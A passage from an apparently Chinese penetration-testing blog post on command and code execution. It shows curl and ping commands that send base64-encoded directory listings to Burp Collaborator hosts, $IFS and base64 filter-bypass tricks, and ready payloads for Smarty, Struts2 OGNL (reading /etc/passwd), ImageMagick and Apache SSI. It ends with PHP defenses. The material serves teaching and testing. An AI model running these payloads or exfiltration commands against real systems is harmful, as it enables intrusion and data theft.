+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ ls|base64</span><br><span class="line">MS5weQoxLnR4dArlhazlhbEK5qih5p2/CuinhumikQrlm77niYcK5paH5qGjCuS4i+i9vQrpn7Pk</span><br><span class="line">uZAK5qGM6Z2iCmRhdGEudHh0CmRucy50eHQKZ2V0LXBpcC5weQpzdGVhZHkudHh0CnRjcC50eHQK</span><br><span class="line">dXJsLnR4dAp1c2JkYXRhLnR4dAo=</span><br></pre></td></tr></table></figure>
+
+<p>ping命令不能使用base64编码的方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ ping `ls|base64`.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.net</span><br><span class="line">ping: dXJsLnR4dAp1c2JkYXRhLnR4dAo=.ophxdk7ibpwk9p8rb5081z5qrhx7lw.burpcollaborator.net: 未知的名称或服务</span><br></pre></td></tr></table></figure>
+
+<p>但是可以使用curl命令发起http请求。配合base64编码绕过限制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl  ypr24cta9q60inhb0h4sxid9g0mqaf.burpcollaborator.net&#x2F;&#96;ls|base64&#96;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201111172955439.png" alt="image-20201111172955439"></p>
+<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><ul>
+<li><p>绕过空格</p>
+<ul>
+<li><p>在bash下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">appledeMacBook-Pro:~ apple$ echo$IFS$9&quot;111&quot;;</span><br><span class="line">111</span><br><span class="line">appledeMacBook-Pro:~ apple$ echo$&#123;IFS&#125;&quot;111&quot;</span><br><span class="line">111</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>敏感字符绕过</p>
+<ul>
+<li><p>利用变量绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ a&#x3D;c;b&#x3D;a;c&#x3D;t;</span><br><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ $a$b$c 1.txt</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用base编码绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ echo &#39;cat&#39; | base64</span><br><span class="line">Y2F0Cg&#x3D;&#x3D;</span><br><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ &#96;echo &#39;Y2F0Cg&#x3D;&#x3D;&#39; | base64 -d&#96; 1.txt</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h3><h5 id="Smarty-lt-3-1-32-php代码执行"><a href="#Smarty-lt-3-1-32-php代码执行" class="headerlink" title="Smarty &lt;= 3.1.32 php代码执行"></a>Smarty &lt;= 3.1.32 php代码执行</h5><p>产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行。</p>
+<p>利用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<h5 id="Struts2命令执行"><a href="#Struts2命令执行" class="headerlink" title="Struts2命令执行"></a>Struts2命令执行</h5><p>产生原因：产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行</p>
+<p>利用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nikenb&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;cat &#x2F;etc&#x2F;passwd&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="ImageMagick-命令执行"><a href="#ImageMagick-命令执行" class="headerlink" title="ImageMagick 命令执行"></a>ImageMagick 命令执行</h5><p>产生原因：</p>
+<p>ImageMagick内置了非常多的图像处理库,通过系统的 system() 命令来调用外部的 lib 进行处理。调用外部 lib 的过程是使用系统的 system 命令来执行的，导致命令执行的代码。</p>
+<p>利用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+
+<h5 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h5><p>产生原因：上传含有命令执行指令的shtml文件，可以导致命令执行。</p>
+<p>利用payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?-- cmd&#x3D;&quot;cat &#x2F;root&#x2F;flag.txt&quot;--?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><ul>
+<li><p>指定黑名单，禁止使用各种危险命令、或者危险函数，并在php.ini中配置disable_functions。</p>
+</li>
+<li><p>程序参数可控的情况下使用escapeshellcmd() </p>
+<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
+<p>程序参数值可控的情况下使用escapeshellarg()</p>
+<p>确保传递给命令安全的参数。</p>
+<p>二者区别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg</span><br><span class="line">1.确保用户只传递一个参数给命令</span><br><span class="line">2.用户不能指定更多的参数一个</span><br><span class="line">3.用户不能执行不同的命令</span><br><span class="line">escapeshellcmd</span><br><span class="line">1.确保用户只执行一个命令</span><br><span class="line">2.用户可以指定不限数量的参数</span><br><span class="line">3.用户不能执行不同的命令</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>eval()函数与system()函数的区别</p>
+<ul>
+<li>前者是执行一段代码，而不是命令，需要加分号。后者执行的是系统命令，而不是一段php代码。</li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://s1eady.top/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="命令执行与代码执行" target="_blank" rel="external">http://s1eady.top/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">果冻</span><small class="ml-1x">Penetration Testing</small></a></h3>
+        <div>一往情深深几许。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2018/12/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="CSRF漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2018/12/08/PHP%E6%9C%A8%E9%A9%AC/" title="PHPSHELL-bypass"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/2.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/1.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
